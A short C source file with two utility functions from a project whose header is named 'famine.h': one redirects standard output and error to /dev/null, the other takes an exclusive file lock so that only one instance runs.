#include "../include/famine.h"

void mute_output() {
    int fd = open("/dev/null", O_WRONLY);
    if (fd == -1)
        exit(1);

    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    close(fd);
}

int lock_global() {
    int fd = open(FLOCK_PATH, O_CREAT | O_RDWR, 0600);
    if (fd < 0) exit(0);

    if (flock(fd, LOCK_EX | LOCK_NB) < 0)
        exit(0);

    return fd;
}
